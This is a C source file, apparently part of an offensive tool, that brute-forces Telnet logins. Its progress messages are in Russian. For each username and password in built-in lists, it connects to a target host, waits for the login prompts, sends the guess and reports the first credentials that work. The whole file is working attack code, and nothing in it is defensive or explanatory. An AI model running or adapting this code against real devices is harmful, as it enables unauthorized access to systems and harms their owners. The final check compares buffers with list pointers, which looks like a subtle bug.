#include "include/includes.h"
#include "bruteforce_functions/wait_for_prompt.c"
#include "bruteforce_functions/socket_things.c"
#include "bruteforce_functions/login_things.c"

Credentials telnet_login(const char *host) {
    static Credentials result;
    char buffer[TELNET_MAX_BUFFER];
    int sock;
    struct sockaddr_in server;

    printf("Пытаемся войти на %s...\n", host);

    for (const char **username = usernames; *username != NULL; username++) {
        for (const char **password = passwords; *password != NULL; password++) {
            sock = create_socket(host, &server);
            if (sock < 0) {
                printf("Не удалось установить соединение\n");
                sleep(1);
                continue;
            }

            printf("Соединение установлено\n");

            // Ожидание приглашения для логина
            if (!wait_for_prompt(sock)) {
                printf("DEBUG: Не удалось получить приглашение для ввода логина\n");
                close_socket(sock, "");
                sleep(2);
                continue;
            }

            printf("Пытаемся войти с логином %s\n", *username);
            send_username(sock, *username);
            sleep(1);

            // Ожидание приглашения для пароля
            if (!wait_for_prompt(sock)) {
                printf("DEBUG: Не удалось получить приглашение для ввода пароля\n");
                close_socket(sock, "");
                sleep(2);
                continue;
            }

            printf("Пытаемся войти с паролем %s\n", *password);
            send_password(sock, *password);
            sleep(2);

            printf("Проверяем успешность входа\n");
            if (check_login_success(sock, buffer)) {
                strncpy(result.username, *username, sizeof(result.username) - 1);
                strncpy(result.password, *password, sizeof(result.password) - 1);
                result.username[sizeof(result.username) - 1] = '\0';
                result.password[sizeof(result.password) - 1] = '\0';
                result.good = 1;
                close_socket(sock, "");
                return result;
            }

            printf("DEBUG: Неудачная попытка входа с %s:%s\n", *username, *password);
            close_socket(sock, "");
            sleep(2); // Задержка между попытками
        }
    }

    // Если вход не удался
    result.username[0] = '\0';
    result.password[0] = '\0';
    result.good = 0;
    return result;
}

Credentials telnet_brute(char *host) {
    Credentials credentials = telnet_login(host);
    
    if (credentials.username[0] != '\0' && credentials.password[0] != '\0') {
        printf("Успешный вход: %s:%s\n", credentials.username, credentials.password);
    } else {
        printf("Не удалось войти на %s\n", host);
    }

    if (credentials.username == usernames[0] && credentials.password == passwords[0]) {
        credentials.good = 0;
    }

    return credentials;
}